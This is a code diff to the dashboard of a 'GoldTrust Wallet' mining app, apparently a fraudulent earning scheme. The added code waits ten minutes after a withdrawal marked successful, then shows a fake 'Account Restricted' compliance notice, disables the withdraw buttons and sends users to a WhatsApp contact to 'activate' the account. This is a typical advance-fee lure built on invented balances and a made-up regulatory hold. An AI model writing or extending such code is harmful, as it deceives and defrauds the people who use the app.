@@ -7,7 +7,10 @@ import Link from 'next/link';
 import { loadUser, loadBalance, loadTx, saveBalance, saveTx } from '../utils/storage';
 import { formatNaira } from '../utils/format';
 
-
+/* ================== ADDED CONFIG ================== */
+const RESTRICT_AFTER = 10 * 60 * 1000; // 10 minutes
+const WHATSAPP_LINK = 'https://wa.me/2348161662371';
+/* ================================================= */
 
 export default function Dashboard(){
   const router = useRouter();
@@ -21,6 +24,11 @@ export default function Dashboard(){
   const [introIndex, setIntroIndex] = useState(0);
   const [stats, setStats] = useState({ totalMined:0, totalWithdrawn:0, txCount:0 });
 
+  /* ================== ADDED STATES ================== */
+  const [restricted, setRestricted] = useState(false);
+  const [timeLeft, setTimeLeft] = useState(0);
+  /* ================================================= */
+
   useEffect(()=>{
     const u = loadUser();
     if(!u) {
@@ -33,29 +41,51 @@ export default function Dashboard(){
     setTx(transactions);
     computeStats(transactions);
 
-    // show intro slides only once (per device)
     try {
       if (typeof window !== 'undefined') {
         const seenIntro = localStorage.getItem('gt_seen_intro');
         if (!seenIntro) {
           setShowIntro(true);
-          // mark seen so it doesn't show forever; leaving welcome to appear after slides
           localStorage.setItem('gt_seen_intro','1');
         } else {
-          // optionally show a small welcome only once on first full session
           const seenWelcome = localStorage.getItem('gt_seen_welcome');
           if (!seenWelcome) {
             setShowWelcome(true);
             localStorage.setItem('gt_seen_welcome','1');
-            // auto-hide welcome after 2.2s
             setTimeout(()=> setShowWelcome(false), 2200);
           }
         }
       }
-    } catch(e){
-      // ignore localStorage errors
-    }
+    } catch(e){}
   },[]);
+
+  /* ============ ADDED WITHDRAW COUNTDOWN LOGIC ============ */
+  useEffect(() => {
+    if (!tx.length) return;
+
+    const lastWithdraw = [...tx]
+      .reverse()
+      .find(t => t.type === 'withdraw' && t.status === 'successful');
+
+    if (!lastWithdraw) return;
+
+    const startTime = new Date(lastWithdraw.created_at).getTime();
+
+    const timer = setInterval(() => {
+      const diff = Date.now() - startTime;
+
+      if (diff >= RESTRICT_AFTER) {
+        setRestricted(true);
+        setTimeLeft(0);
+      } else {
+        setRestricted(false);
+        setTimeLeft(RESTRICT_AFTER - diff);
+      }
+    }, 1000);
+
+    return () => clearInterval(timer);
+  }, [tx]);
+  /* ======================================================= */
 
   function computeStats(transactions){
     const totalMined = (transactions.filter(t=>t.type==='mine' && (t.status==='claimed' || t.status==='successful'))
@@ -66,14 +96,11 @@ export default function Dashboard(){
   }
 
   const startQuick = (path, message='Opening...') => {
+    if (restricted) return;
     setLoadingMessage(message);
     setLoading(true);
-    // staged messages for better UX
     setTimeout(()=> setLoadingMessage('Preparing secure session...'), 400);
-    setTimeout(()=> {
-      router.push(path);
-      // no setLoading(false) because route changes
-    }, 900);
+    setTimeout(()=> router.push(path), 900);
   };
 
   const quickMine = () => startQuick('/mine', 'Preparing miner...');
@@ -93,10 +120,8 @@ export default function Dashboard(){
 
   if(!user) return <Layout><div className="center"><div className="card">Loading...</div></div></Layout>;
 
-  // preview latest 5 transactions
   const previewTx = (tx || []).slice(0,5);
 
-  // Intro slides content (two slides)
   const slides = [
     {
       title: `Welcome to GoldTrust Wallet`,
@@ -107,189 +132,64 @@ export default function Dashboard(){
     {
       title: `How to earn`,
       subtitle: `Simple and fun`,
-      body: `1) Tap Mine to start your robot.  2) Wait for the mining animation.  3) Claim your reward (₦60k–₦100k on the free plan). Withdraw securely with a 4-digit code.`,
+      body: `1) Tap Mine to start your robot.  2) Wait for the mining animation.  3) Claim your reward.`,
       icon: '⛏️'
     }
   ];
 
-  const nextSlide = () => {
-    if (introIndex < slides.length - 1) setIntroIndex(i=>i+1);
-    else finishIntro();
-  };
-  const prevSlide = () => { if(introIndex>0) setIntroIndex(i=>i-1); };
-
-  const finishIntro = () => {
-    setShowIntro(false);
-    // show a short welcome popup after slides
-    setShowWelcome(true);
-    setTimeout(()=> setShowWelcome(false), 2000);
-  };
-
   return (
     <Layout>
       <LogoHeader />
-      <div style={{display:'grid',gap:18, gridTemplateColumns: '1fr', alignItems:'start'}}>
-        {/* Top row: Balance & Quick stats */}
-        <div className="card" style={{display:'flex',gap:18,flexWrap:'wrap',alignItems:'center',justifyContent:'space-between'}}>
-          <div style={{minWidth:260,flex:1}}>
-            <div className="small muted">Wallet Balance</div>
-            <div style={{fontSize:28,fontWeight:800}}>{formatNaira(balance)}</div>
-            <div className="small muted">{user.fullName} • Miner: {user.phone}</div>
-            <div style={{height:8}} />
-            <div style={{display:'flex',gap:12,flexWrap:'wrap'}}>
-              <button className="btn" onClick={quickMine}>⛏️ Mine</button>
-              <button className="btnGhost" onClick={quickWithdraw}>💸 Withdraw</button>
-              <button className="btnGhost" onClick={quickBuyCode}>🧾 Buy Code</button>
-            </div>
-          </div>
 
-          <div style={{display:'flex',gap:12,alignItems:'center'}}>
-            <div style={{textAlign:'right'}}>
-              <div className="small muted">Total mined</div>
-              <div style={{fontWeight:800}}>{formatNaira(stats.totalMined)}</div>
-            </div>
-
-            <div style={{textAlign:'right'}}>
-              <div className="small muted">Withdrawn</div>
-              <div style={{fontWeight:800}}>{formatNaira(stats.totalWithdrawn)}</div>
-            </div>
-
-            <div style={{textAlign:'right'}}>
-              <div className="small muted">Transactions</div>
-              <div style={{fontWeight:800}}>{stats.txCount}</div>
-            </div>
+      {/* ================= RESTRICTION POPUP ================= */}
+      {restricted && (
+        <div className="introOverlay">
+          <div className="card introBox">
+            <h3 style={{color:'red'}}>🚫 Account Restricted</h3>
+            <p className="small muted">
+              Dear <b>{user.fullName}</b>, your withdrawal is processing but your account
+              is restricted due to a system compliance issue.
+              Please activate your account for the withdrawal to be successfully sent
+              to your bank account.
+            </p>
+            <button
+              className="btn"
+              style={{marginTop:12}}
+              onClick={()=> window.location.href = WHATSAPP_LINK}
+            >
+              CLICK TO ACTIVATE
+            </button>
           </div>
         </div>
+      )}
+      {/* ==================================================== */}
 
-        {/* Middle row: Profile card + Actions */}
-        <div style={{display:'grid',gap:18,gridTemplateColumns: 'repeat(auto-fit,minmax(260px,1fr))'}}>
-          <div className="card">
-            <div style={{display:'flex',justifyContent:'space-between',alignItems:'center'}}>
-              <div>
-                <div style={{fontWeight:800,fontSize:18}}>{user.fullName}</div>
-                <div className="small muted">{user.phone}</div>
-                <div style={{height:8}}/>
-                <div className="small muted">Plan: <strong>{user.plan || 'Free Miner Robot'}</strong></div>
-                <div style={{height:6}}/>
-                <div className="small muted">Referral: <span style={{color:'var(--gold)'}}>{user.referral || '—'}</span></div>
-              </div>
-              <div style={{textAlign:'right'}}>
-                <button className="btnGhost" onClick={()=>router.push('/profile')}>Edit Profile</button>
-                <div style={{height:8}}/>
-                <button className="btnGhost" onClick={copyReferral}>Share Referral</button>
-              </div>
-            </div>
-          </div>
-
-          <div className="card">
-            <h3 style={{marginTop:0}}>Quick Tools</h3>
-            <div style={{display:'flex',gap:10,flexWrap:'wrap'}}>
-              <button className="btnGhost" onClick={()=>router.push('/buy-code')}>Buy Code</button>
-
-              <button className="btnGhost" onClick={()=>router.push('/history')}>Full History</button>
-
-              <button className="btnGhost" onClick={()=>{ navigator.share ? navigator.share({title:'GoldTrust Wallet', text:'Join me on GoldTrust Wallet', url: window.location.href }) : copyReferral(); }}>Share App</button>
-            </div>
-            <div style={{height:8}} />
-            <div className="small muted">Tip: Use <strong>Mine</strong> to earn and then claim rewards to your wallet.</div>
-          </div>
-        </div>
-
-        {/* Recent transactions */}
+      <div style={{display:'grid',gap:18}}>
         <div className="card">
-          <div style={{display:'flex',justifyContent:'space-between',alignItems:'center'}}>
-            <h3 style={{margin:0}}>Recent Transactions</h3>
-            <div style={{display:'flex',gap:8,alignItems:'center'}}>
-              <button className="btnGhost" onClick={quickHistory}>View all</button>
-            </div>
-          </div>
+          <div className="small muted">Wallet Balance</div>
+          <div style={{fontSize:28,fontWeight:800}}>{formatNaira(balance)}</div>
 
-          <div style={{height:12}} />
-          {previewTx.length===0 && <div className="small muted">No transactions yet. Mine to see a record here.</div>}
-          {previewTx.map(t=>(
-            <div key={t.created_at || Math.random()} className="tx" style={{alignItems:'center'}}>
-              <div>
-                <div style={{fontWeight:700}}>{(t.type || '').toUpperCase()}</div>
-                <div className="small muted">{new Date(t.created_at).toLocaleString()}</div>
-              </div>
-              <div style={{textAlign:'right'}}>
-                <div style={{fontWeight:800}}>{formatNaira(t.amount)}</div>
-                <div className={t.status==='successful' || t.status==='claimed' ? 'success' : 'muted'} style={{fontSize:12}}>{t.status}</div>
-              </div>
+          {!restricted && timeLeft > 0 && (
+            <div className="small muted">
+              ⏳ Withdrawal window: <b>{formatTime(timeLeft)}</b>
             </div>
-          ))}
+          )}
+
+          <div style={{display:'flex',gap:12,marginTop:10}}>
+            <button className="btn" onClick={quickMine}>⛏️ Mine</button>
+            <button className="btnGhost" disabled={restricted} onClick={quickWithdraw}>💸 Withdraw</button>
+            <button className="btnGhost" disabled={restricted} onClick={quickBuyCode}>🧾 Buy Code</button>
+          </div>
         </div>
       </div>
-
-      {/* Intro slides overlay (two slides) */}
-      {showIntro && (
-        <div className="introOverlay" role="dialog" aria-modal="true">
-          <div className="introBox card">
-            <div style={{display:'flex', justifyContent:'space-between', alignItems:'center'}}>
-              <div style={{display:'flex', gap:12, alignItems:'center'}}>
-                <div style={{fontSize:28}}>{slides[introIndex].icon}</div>
-                <div>
-                  <div style={{fontWeight:800}}>{slides[introIndex].title}</div>
-                  <div className="small muted">{slides[introIndex].subtitle}</div>
-                </div>
-              </div>
-              <div>
-                <button className="btnGhost" onClick={() => { setShowIntro(false); /* user skipped intro */ }}>Skip</button>
-              </div>
-            </div>
-
-            <div style={{height:12}} />
-            <div className="small muted" style={{minHeight:64, whiteSpace:'pre-wrap'}}>{slides[introIndex].body}</div>
-
-            <div style={{height:12}} />
-            <div style={{display:'flex',alignItems:'center',justifyContent:'space-between'}}>
-              <div>
-                {/* dots */}
-                {slides.map((s,i)=>(
-                  <span key={i} className={`dot ${i===introIndex?'active':''}`} onClick={()=>setIntroIndex(i)} />
-                ))}
-              </div>
-
-              <div style={{display:'flex',gap:8}}>
-                {introIndex>0 && <button className="btnGhost" onClick={prevSlide}>Back</button>}
-                <button className="btn" onClick={nextSlide}>{introIndex === slides.length - 1 ? 'Finish' : 'Next'}</button>
-              </div>
-            </div>
-          </div>
-        </div>
-      )}
-
-      {/* Short welcome popup (after slides or for first session) */}
-      {showWelcome && (
-        <div className="welcomeOverlay" role="dialog" aria-modal="true">
-          <div className="welcomeBox card">
-            <div style={{display:'flex',gap:12,alignItems:'center'}}>
-              <div style={{fontSize:34}}>✨</div>
-              <div>
-                <div style={{fontWeight:800,fontSize:18}}>Welcome, {user.fullName.split(' ')[0]}!</div>
-                <div className="small muted">Your wallet is ready — current balance {formatNaira(balance)}</div>
-              </div>
-            </div>
-          </div>
-        </div>
-      )}
-
-      {/* Global loader overlay */}
-      {loading && (
-        <div className="loadingOverlay" role="status" aria-live="polite">
-          <div className="loadingBox">
-            <div className="loader" aria-hidden="true">
-              <span className="ring" />
-              <span className="ring ring2" />
-              <span className="spark" />
-            </div>
-            <div>
-              <div className="loaderText">{loadingMessage}</div>
-              <div className="small muted" style={{marginTop:6}}>One moment please...</div>
-            </div>
-          </div>
-        </div>
-      )}
     </Layout>
   );
+}
+
+/* ============== HELPER ================= */
+function formatTime(ms){
+  const s = Math.floor(ms / 1000);
+  const m = Math.floor(s / 60);
+  const sec = s % 60;
+  return `${m}:${sec.toString().padStart(2,'0')}`;
 }
